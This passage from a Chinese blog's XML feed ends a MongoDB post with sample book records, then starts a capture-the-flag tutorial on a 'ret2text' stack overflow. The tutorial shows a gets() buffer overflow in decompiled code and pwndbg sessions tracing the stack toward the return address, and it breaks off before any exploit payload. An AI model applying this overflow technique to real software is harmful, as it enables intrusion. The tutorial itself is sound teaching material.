class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaf&quot;), &quot;title&quot; : &quot;book-10&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 99, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 27 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbd4&quot;), &quot;title&quot; : &quot;book-47&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 96, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 24 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba8&quot;), &quot;title&quot; : &quot;book-3&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 92, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx009&quot;, &quot;age&quot; : 31 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb4&quot;), &quot;title&quot; : &quot;book-15&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;nosql&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 87, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 34 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc2&quot;), &quot;title&quot; : &quot;book-29&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;nosql&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 87, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx006&quot;, &quot;age&quot; : 21 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbd2&quot;), &quot;title&quot; : &quot;book-45&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;popular&quot; ], &quot;favCount&quot; : 86, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 23 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbba&quot;), &quot;title&quot; : &quot;book-21&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 84, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 27 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbca&quot;), &quot;title&quot; : &quot;book-37&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;popular&quot; ], &quot;favCount&quot; : 83, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 23 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc7&quot;), &quot;title&quot; : &quot;book-34&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;document&quot; ], &quot;favCount&quot; : 80, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;age&quot; : 20 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc1&quot;), &quot;title&quot; : &quot;book-28&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;document&quot; ], &quot;favCount&quot; : 76, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 25 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc5&quot;), &quot;title&quot; : &quot;book-32&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;document&quot; ], &quot;favCount&quot; : 76, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 30 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc6&quot;), &quot;title&quot; : &quot;book-33&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 75, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;age&quot; : 29 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dba5&quot;), &quot;title&quot; : &quot;book-0&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;mongodb&quot;, &quot;developer&quot; ], &quot;favCount&quot; : 72, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx002&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbad&quot;), &quot;title&quot; : &quot;book-8&quot;, &quot;type&quot; : &quot;sociality&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 70, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx005&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbaa&quot;), &quot;title&quot; : &quot;book-5&quot;, &quot;type&quot; : &quot;novel&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 67, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx008&quot;, &quot;age&quot; : 26 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbc9&quot;), &quot;title&quot; : &quot;book-36&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;nosql&quot;, &quot;popular&quot; ], &quot;favCount&quot; : 66, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx001&quot;, &quot;age&quot; : 21 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbcf&quot;), &quot;title&quot; : &quot;book-42&quot;, &quot;type&quot; : &quot;literature&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 65, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx003&quot;, &quot;age&quot; : 29 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbd1&quot;), &quot;title&quot; : &quot;book-44&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;document&quot;, &quot;mongodb&quot; ], &quot;favCount&quot; : 64, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx007&quot;, &quot;age&quot; : 31 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbcd&quot;), &quot;title&quot; : &quot;book-40&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;developer&quot;, &quot;document&quot; ], &quot;favCount&quot; : 63, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 25 &#125; &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;6271102510f566b3b1a8dbb0&quot;), &quot;title&quot; : &quot;book-11&quot;, &quot;type&quot; : &quot;technology&quot;, &quot;tag&quot; : [ &quot;popular&quot;, &quot;nosql&quot; ], &quot;favCount&quot; : 61, &quot;author&quot; : &#123; &quot;name&quot; : &quot;xx000&quot;, &quot;age&quot; : 32 &#125; &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;上一次我们对mongodb的一些简单命令进行讲解，这一次我们来看下mongodb的高级操作吧&lt;/p&gt;</summary>
    
    
    
    <category term="mongodb" scheme="http://www.shicoder.top/categories/mongodb/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>ret2text</title>
    <link href="http://www.shicoder.top/posts/54851116.html"/>
    <id>http://www.shicoder.top/posts/54851116.html</id>
    <published>2022-05-02T12:13:29.000Z</published>
    <updated>2022-05-03T01:43:14.213Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>上一次我们介绍了函数调用栈，这一次我们就来看一道最简单的栈溢出题目：<code>ret2text</code></p><span id="more"></span><p>先来看下运行题目输出什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">./ret2text</span> </span><br><span class="line">Have you heard of buffer overflow?</span><br><span class="line"><span class="meta">&gt;</span><span class="language-bash">aaaaaaa</span></span><br><span class="line">It seems that you know nothing about it ......</span><br></pre></td></tr></table></figure><p>第一步使用<code>checksec</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">ROP$ </span><span class="language-bash">checksec ret2text</span> </span><br><span class="line">[*] &#x27;/home/pwn/桌面/题目/ROP/ret2text&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>然后直接使用<code>IDA32</code>打开，<code>F5</code>插件显示源码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard of buffer overflow?&quot;</span>);</span><br><span class="line">  <span class="built_in">vulnerable</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;It seems that you know nothing about it ......&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vulnerable</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">8</span>]; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="built_in">gets</span>(buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显<code>gets</code>函数会出现栈溢出</p><p>栈溢出的攻击原理就是，向缓冲区空间写入足够以及特定的字符，以覆盖该函数的上一个函数的栈帧，比如覆盖调用完下一条指令的地方，如下图</p><p><img src="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220502202029252.png" alt="image-20220502202029252"></p><p>将输入的值覆盖<code>return address</code>，则就会执行我们的特定的函数，我们再来看该程序的<code>vulnerable</code>的栈部分，使用<code>pwngdb</code>（后面我会单独开一次讲下gdb的教程）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">b main</span></span><br><span class="line">Breakpoint 1 at 0x804856b: file babystack.c, line 22.</span><br><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /home/pwn/桌面/题目/ROP/ret2text </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at babystack.c:22</span><br><span class="line">22babystack.c: 没有那个文件或目录.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> EAX  0xf7fb7808 (environ) —▸ 0xffffd22c —▸ 0xffffd3f5 ◂— &#x27;SSH_AUTH_SOCK=/run/user/1000/keyring/ssh&#x27;</span><br><span class="line"> EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line"> ECX  0xffffd190 ◂— 0x1</span><br><span class="line"> EDX  0xffffd1b4 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line"> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line"> EBP  0xffffd178 ◂— 0x0</span><br><span class="line"> ESP  0xffffd170 —▸ 0xffffd190 ◂— 0x1</span><br><span class="line"> EIP  0x804856b (main+26) —▸ 0xfff8838b ◂— 0xfff8838b</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line"> ► 0x804856b &lt;main+26&gt;    mov    eax, dword ptr [ebx - 8] &lt;0xf7fb7808&gt;</span><br><span class="line">   0x8048571 &lt;main+32&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x8048573 &lt;main+34&gt;    sub    esp, 8</span><br><span class="line">   0x8048576 &lt;main+37&gt;    push   0</span><br><span class="line">   0x8048578 &lt;main+39&gt;    push   eax</span><br><span class="line">   0x8048579 &lt;main+40&gt;    call   setbuf@plt &lt;setbuf@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x804857e &lt;main+45&gt;    add    esp, 0x10</span><br><span class="line">   0x8048581 &lt;main+48&gt;    mov    eax, dword ptr [ebx - 4]</span><br><span class="line">   0x8048587 &lt;main+54&gt;    mov    eax, dword ptr [eax]</span><br><span class="line">   0x8048589 &lt;main+56&gt;    sub    esp, 8</span><br><span class="line">   0x804858c &lt;main+59&gt;    push   0</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd170 —▸ 0xffffd190 ◂— 0x1</span><br><span class="line">01:0004│      0xffffd174 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">03:000c│      0xffffd17c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd180 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd188 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd18c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► f 0  804856b main+26</span><br><span class="line">   f 1 f7de9ee5 __libc_start_main+245</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在断在了<code>main</code>函数处，我们知道漏洞在<code>vulnerable</code>，所以步过到<code>vulnerable</code>处（n）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">n</span></span><br><span class="line">Have you heard of buffer overflow?</span><br><span class="line">25in babystack.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x23</span><br><span class="line"> EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line">*ECX  0xffffffff</span><br><span class="line">*EDX  0xffffffff</span><br><span class="line"> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line"> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line"> EBP  0xffffd178 ◂— 0x0</span><br><span class="line"> ESP  0xffffd170 —▸ 0xffffd190 ◂— 0x1</span><br><span class="line">*EIP  0x80485a9 (main+88) —▸ 0xffff48e8 ◂— 0x0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x8048597 &lt;main+70&gt;     sub    esp, 0xc</span><br><span class="line">   0x804859a &lt;main+73&gt;     lea    eax, [ebx - 0x1998]</span><br><span class="line">   0x80485a0 &lt;main+79&gt;     push   eax</span><br><span class="line">   0x80485a1 &lt;main+80&gt;     call   puts@plt &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485a6 &lt;main+85&gt;     add    esp, 0x10</span><br><span class="line"> ► 0x80485a9 &lt;main+88&gt;     call   vulnerable &lt;vulnerable&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485ae &lt;main+93&gt;     sub    esp, 0xc</span><br><span class="line">   0x80485b1 &lt;main+96&gt;     lea    eax, [ebx - 0x1974]</span><br><span class="line">   0x80485b7 &lt;main+102&gt;    push   eax</span><br><span class="line">   0x80485b8 &lt;main+103&gt;    call   puts@plt &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x80485bd &lt;main+108&gt;    add    esp, 0x10</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd170 —▸ 0xffffd190 ◂— 0x1</span><br><span class="line">01:0004│      0xffffd174 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">03:000c│      0xffffd17c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd180 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">... ↓</span><br><span class="line">06:0018│      0xffffd188 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd18c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  80485a9 main+88</span><br><span class="line">   f 1 f7de9ee5 __libc_start_main+245</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后步进（s），我们可以从<code>IDA</code>中看到，第一行就是<code>gets</code>，所以我们再次步过（n）就会停住</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">s</span></span><br><span class="line">vulnerable () at babystack.c:12</span><br><span class="line">12in babystack.c</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">*EAX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line"> EBX  0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line"> ECX  0xffffffff</span><br><span class="line"> EDX  0xffffffff</span><br><span class="line"> EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line"> ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">*EBP  0xffffd168 —▸ 0xffffd178 ◂— 0x0</span><br><span class="line">*ESP  0xffffd150 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">*EIP  0x8048507 (vulnerable+17) ◂— sub    esp, 0xc</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x8048507 &lt;vulnerable+17&gt;    sub    esp, 0xc</span><br><span class="line">   0x804850a &lt;vulnerable+20&gt;    lea    edx, [ebp - 0x10]</span><br><span class="line">   0x804850d &lt;vulnerable+23&gt;    push   edx</span><br><span class="line">   0x804850e &lt;vulnerable+24&gt;    mov    ebx, eax</span><br><span class="line">   0x8048510 &lt;vulnerable+26&gt;    call   gets@plt &lt;gets@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048515 &lt;vulnerable+31&gt;    add    esp, 0x10</span><br><span class="line">   0x8048518 &lt;vulnerable+34&gt;    mov    eax, 0</span><br><span class="line">   0x804851d &lt;vulnerable+39&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x8048520 &lt;vulnerable+42&gt;    leave  </span><br><span class="line">   0x8048521 &lt;vulnerable+43&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x8048522 &lt;get_shell&gt;        push   ebp</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd150 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">... ↓</span><br><span class="line">02:0008│      0xffffd158 —▸ 0xffffd178 ◂— 0x0</span><br><span class="line">03:000c│      0xffffd15c —▸ 0x80485a6 (main+85) ◂— add    esp, 0x10</span><br><span class="line">04:0010│      0xffffd160 —▸ 0x8048668 ◂— dec    eax /* &#x27;Have you heard of buffer overflow?&#x27; */</span><br><span class="line">05:0014│      0xffffd164 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line">06:0018│ ebp  0xffffd168 —▸ 0xffffd178 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd16c —▸ 0x80485ae (main+93) ◂— sub    esp, 0xc</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0  8048507 vulnerable+17</span><br><span class="line">   f 1  80485ae main+93</span><br><span class="line">   f 2 f7de9ee5 __libc_start_main+245</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">n</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>假装输入<code>AAAAAAAA</code>，我们此时使用<code>stack 24</code>看下栈中24字节</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt; </span><span class="language-bash">stack 24</span></span><br><span class="line">00:0000│ esp  0xffffd150 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">... ↓</span><br><span class="line">02:0008│ eax  0xffffd158 ◂— &#x27;AAAAAAAA&#x27;</span><br><span class="line">... ↓</span><br><span class="line">04:0010│ edx  0xffffd160 —▸ 0x8048600 (__libc_csu_init+32) ◂— dec    dword ptr [ebp - 0xfb7d]</span><br><span class="line">05:0014│      0xffffd164 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f0c (_DYNAMIC) ◂— 0x1</span><br><span class="line">06:0018│ ebp  0xffffd168 —▸ 0xffffd178 ◂— 0x0</span><br><span class="line">07:001c│      0xffffd16c —▸ 0x80485ae (main+93) ◂— sub    esp, 0xc</span><br><span class="line">08:0020│      0xffffd170 —▸ 0xffffd190 ◂— 0x1</span><br><span class="line">09:0024│      0xffffd174 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0b:002c│      0xffffd17c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 0x10</span><br><span class="line">0c:0030│      0xffffd180 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1e9d6c</span><br><span class="line">... ↓</span><br><span class="line">0e:0038│      0xffffd188 ◂— 0x0</span><br><span class="line">0f:003c│      0xffffd18c —▸ 0xf7de9ee5 (__libc_start_main+245) ◂— add    esp, 